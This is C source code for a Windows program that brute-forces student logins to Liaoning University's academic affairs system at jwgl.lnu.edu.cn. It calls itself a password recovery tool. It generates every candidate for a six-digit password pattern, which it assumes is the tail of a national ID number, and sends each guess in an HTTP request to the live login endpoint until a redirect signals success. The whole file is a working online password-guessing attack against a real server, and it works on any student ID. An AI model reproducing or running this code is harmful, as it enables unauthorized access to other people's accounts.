#include<winsock.h>
#include<string.h>
#include<stdio.h>
#include<conio.h>
#include<math.h>
#pragma comment(lib, "ws2_32.lib") 
int ShowLast(int last)
{/*标题栏实时显示剩余个数，若传入-1显示成功，传入-2显示失败*/
	char t[7] = {0};
	if (last == -1)
		SetConsoleTitle("Succeed");
	else if (last == -2)
		SetConsoleTitle("Fail");
	else
		SetConsoleTitle(_itoa(last,t,10));
	return 0;
}
int CheckLogin(char *SiteInfo)
{/*根据传入的网页内容字符串判断本次尝试是否正确，若成功验证则返回1，失败返回0，服务端退出或其他情况返回-1*/
	if (strstr(SiteInfo,"1.1 302"))//成功情况
		return 1;
	else if (strstr(SiteInfo,"close"))//服务端关闭连接
		return -1;
	else if (strstr(SiteInfo,"1.1 200"))//失败情况
		return 0;
	else
		return -1;
}
int CreatePwdList(char *pwd,char ***pwdList)
{/*生成待使用的密码表pwdList，返回密码表中密码个数*/
	register int i,ti,j,k=0,n=0,tnum=0;//通配符个数，待返回的密码个数
	int max,min;//能达到的最大数，基数
	int type=0;//type10:有最高位，type100:有最高位与次高位
	for (j=5;j>=0;j--)//计算type
	{
		if (pwd[j] == '?')//若是找到通配符，待计算位数+1
		{
			n++;
			if (j == 0 && pwd[j+1] != '?')//最高位为通配符
				type += 10;
			else if (j == 0 && pwd[j+1] == '?')//最高位与次高位为通配符
				type += 100;
		}
	}
	switch (type)
	{
	case 0:
		tnum = pow(10.0,n);
		max = tnum - 1;
		min = 0;
		break;
	case 10:
		tnum = 4 * pow(10.0,n-1);
		min = 0;
		max = 4 * pow(10.0,n-1) - 1;
		break;
	case 100:
		tnum = 31 * pow(10.0,n-2);
		min = pow(10.0,n-2);
		max = tnum + min - 1;
		break;
	default:
		break;
	}
	*pwdList = (char**)malloc(tnum*sizeof(char*));
	for (i=0;i<tnum;i++)
		(*pwdList)[i] = (char*)malloc(7*sizeof(char));//初始化密码表
	for (i=min;i<=max;i++)//填充密码表
	{
		strcpy((*pwdList)[k],pwd);
		ti = i;
		for (j=5;j>=0;j--)
		{
			if ((*pwdList)[k][j] == '?')
			{
				(*pwdList)[k][j] = ti % 10 + '0';
				ti /= 10;
			}
		}
		k++;
	}
	return tnum;
}
long CheckBegin(char *stuid,char *pwd)
{/*输入参数：	pwd(密码格式串)，返回运行时间(ms)*/
	char **PwdList = NULL;//指向密码表
	int PwdNum;//密码个数
	register int i,tnum;//tnum:剩余密码个数
	long t;//计算运行时间

	/*套接字初始化部分*/
	int timeout = 20000;//超时20s
	int TimedOutFlag = 0;
	WSADATA WSAData={0}; 
	SOCKET sockinf; 
	struct sockaddr_in addr; 
	struct hostent *pURL; 
	char header[1024] = {0};//请求头
	char sitebuf[2049] = {0};//存放页面内容
	if (WSAStartup(MAKEWORD(2,2),&WSAData))
	{
		printf("\n\n套接字启动失败！\n");
		return 0;
	}
	pURL = gethostbyname("jwgl.lnu.edu.cn"); 
	if (!pURL)
	{
		printf("\n\n获得统一定位符失败！\n");
		return 0;
	}
	addr.sin_family = AF_INET; 
	addr.sin_addr.s_addr = *((unsigned long*)pURL->h_addr); 
	addr.sin_port = htons(80); 
	sockinf = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); 
	setsockopt(sockinf,SOL_SOCKET,SO_RCVTIMEO,(char*)&timeout,sizeof(int));//设置recv超时为20s
	connect(sockinf,(SOCKADDR *)&addr,sizeof(addr)); 

	t = GetTickCount();//从生成密码表开始计时
	tnum = PwdNum = CreatePwdList(pwd,&PwdList);//生成密码表并返回个数
	printf("\n共%d个待测试密码",PwdNum);
	for (i=0;i<PwdNum;i++)
	{
		/*套接字初始化与查询分离为了加速*/
		do
		{
			sprintf(header,"GET /pls/wwwbks/bks_login2.login?stuid=%s&pwd=%s HTTP/1.1\r\nHost: jwgl.lnu.edu.cn\r\nConnection: keep-alive\r\n\r\n",stuid,PwdList[i]);
			send(sockinf,header,strlen(header),0); 
			if (recv(sockinf,sitebuf,2048,0) < 0)//捕获到超时
			{
				TimedOutFlag++;
				if (TimedOutFlag == 3)//超时达到3次
				{
					if (IDNO == MessageBox(NULL,"请求超时次数达到3次\n是:继续等待，否:退出程序","Something wrong!",MB_YESNO))
					{
						printf("\n\n用户选择了终止程序！\n");
						goto CLR;//用户选择停止程序
					}
					sitebuf[0] = 0;
					TimedOutFlag = 0;//用户选择继续等待，之后socket重连
				}
			}
			else
				TimedOutFlag = 0;
		}while(TimedOutFlag);//上一次超时

		if (CheckLogin(sitebuf) == 1)//登录成功，提示，退出循环
		{
			ShowLast(-1);
			printf("\n\n找到正确的密码！\nPwd = %s\n",PwdList[i]);
			break;
		}
		else if (CheckLogin(sitebuf) == -1)//socket重连
		{
			closesocket(sockinf);
			sockinf = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); 
			setsockopt(sockinf,SOL_SOCKET,SO_RCVTIMEO,(char*)&timeout,sizeof(int));//设置recv超时为60s
			connect(sockinf,(SOCKADDR *)&addr,sizeof(addr)); 
			i--;
		}
		else
			ShowLast(--tnum);//标题栏显示剩余密码个数
	}
	if (i == PwdNum)//所有情况全部尝试，没有找到正确的密码
	{
		ShowLast(-2);
		printf("\n\n密码表中无法找到正确的密码！\n");
	}
CLR:
	for (i=0;i<PwdNum;i++)
		free(PwdList[i]);//释放内存
	closesocket(sockinf);//关闭socket
	WSACleanup();//清除套接字
	t = GetTickCount() - t;//计算运行总时间
	return t;
}
int IsRightStr(char *src,char *chk)
{/*检查源字符串是否只包含chk字符串中的字符*/
	if (strspn(src,chk) == strlen(src))
		return 1;
	return 0;
}

int main()
{
	char stuid[10] = {0};//学号
	char pwd[7] = {0};//密码
	long RunTime;//运行时间
	int h,m;//时分
	printf("辽宁大学综合教务管理系统登录密码找回\n--请保证未改过原始密码(身份证后六位)，否则无效\n--六位密码输入样例：1234??表示查找123400~123499\n--输入超过限定长度将被截断\n--开始找回密码后标题栏将自动更新剩余尝试数\n\n");
	do
	{
		printf("输入九位数字学号：");
		scanf_s("%s",stuid,10);
	}while(!IsRightStr(stuid,"1234567890"));//学号输入不符合规范
	do
	{
		printf("输入六位密码(数字/?)：");
		scanf_s("%s",pwd,7);
	}while(!IsRightStr(pwd,"1234567890?"));//密码输入不符合规范
	RunTime = CheckBegin(stuid,pwd);//开始检查
	h = RunTime/3600000;//计算小时数
	RunTime %= 3600000;
	m = RunTime/60000;//计算分钟数
	RunTime %= 60000;
	printf("\n运行了：%d时%d分%d秒\n",h,m,RunTime/1000);

	system("pause");
	
	return 0;
}